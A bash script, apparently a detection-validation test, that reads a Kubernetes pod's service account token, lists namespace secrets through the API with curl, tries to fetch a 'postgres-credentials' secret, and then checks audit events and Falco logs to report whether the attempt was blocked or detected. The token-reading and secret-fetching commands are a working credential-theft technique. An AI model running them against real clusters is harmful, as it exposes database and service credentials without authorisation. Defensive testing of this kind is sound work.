#!/bin/bash
# Test: Kubernetes Secret Enumeration
# Attempts to list and read secrets using pod's service account

set -euo pipefail

TEST_NAME="k8s-secret-enumeration"
NAMESPACE="${TEST_NAMESPACE:-default}"

echo "=== Test: Kubernetes Secret Enumeration ==="

# Get a pod to execute commands from (use existing pod or create one)
POD=$(kubectl get pods -n ${NAMESPACE} -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

if [ -z "$POD" ]; then
    echo "No existing pods found. Creating test pod..."
    kubectl run secret-enum-test -n ${NAMESPACE} --image=alpine:latest -- sleep 3600
    kubectl wait --for=condition=Ready pod/secret-enum-test -n ${NAMESPACE} --timeout=60s
    POD="secret-enum-test"
    CLEANUP=true
fi

# Get the service account token
SA_TOKEN=$(kubectl exec ${POD} -n ${NAMESPACE} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -z "$SA_TOKEN" ]; then
    echo "ATTACK_SUCCESS=false"
    echo "BLOCKED_BY=No service account token mounted"
    exit 0
fi

# Attempt to list secrets using the service account token
RESULT=$(kubectl exec ${POD} -n ${NAMESPACE} -- sh -c "
    apk add --no-cache curl >/dev/null 2>&1
    curl -k -H 'Authorization: Bearer ${SA_TOKEN}' \
         https://kubernetes.default.svc/api/v1/namespaces/${NAMESPACE}/secrets
" 2>&1 || echo "FAILED")

if echo "$RESULT" | grep -q '"kind":"SecretList"'; then
    echo "ATTACK_SUCCESS=true"
    echo "Successfully enumerated secrets using service account token"

    # Count how many secrets were accessible
    SECRET_COUNT=$(echo "$RESULT" | grep -o '"name":' | wc -l)
    echo "Accessible secrets: ${SECRET_COUNT}"

    # Attempt to read a specific secret (postgres credentials)
    SECRET_DATA=$(kubectl exec ${POD} -n ${NAMESPACE} -- sh -c "
        curl -k -H 'Authorization: Bearer ${SA_TOKEN}' \
             https://kubernetes.default.svc/api/v1/namespaces/${NAMESPACE}/secrets/postgres-credentials 2>/dev/null
    " 2>&1 || echo "")

    if echo "$SECRET_DATA" | grep -q '"data"'; then
        echo "Successfully retrieved secret data!"
        echo "WARNING: Database credentials exposed"
    fi

    # Check for detection
    sleep 10

    # Check Kubernetes audit logs (if accessible)
    if kubectl get events -n ${NAMESPACE} --field-selector reason=SecretAccess 2>/dev/null | grep -q "secrets"; then
        echo "DETECTED=true"
        echo "MTTD=10"
    else
        # Check Falco
        if kubectl logs -n falco -l app=falco --since=30s 2>/dev/null | grep -q "secret"; then
            echo "DETECTED=true"
            echo "MTTD=10"
        else
            echo "DETECTED=false"
        fi
    fi
elif echo "$RESULT" | grep -q "Forbidden"; then
    echo "ATTACK_SUCCESS=false"
    echo "BLOCKED_BY=RBAC (service account lacks permissions)"
else
    echo "ATTACK_SUCCESS=false"
    echo "BLOCKED_BY=Network Policy or API server inaccessible"
fi

# Cleanup
if [ "${CLEANUP:-false}" = "true" ]; then
    kubectl delete pod secret-enum-test -n ${NAMESPACE} --force --grace-period=0 2>/dev/null || true
fi
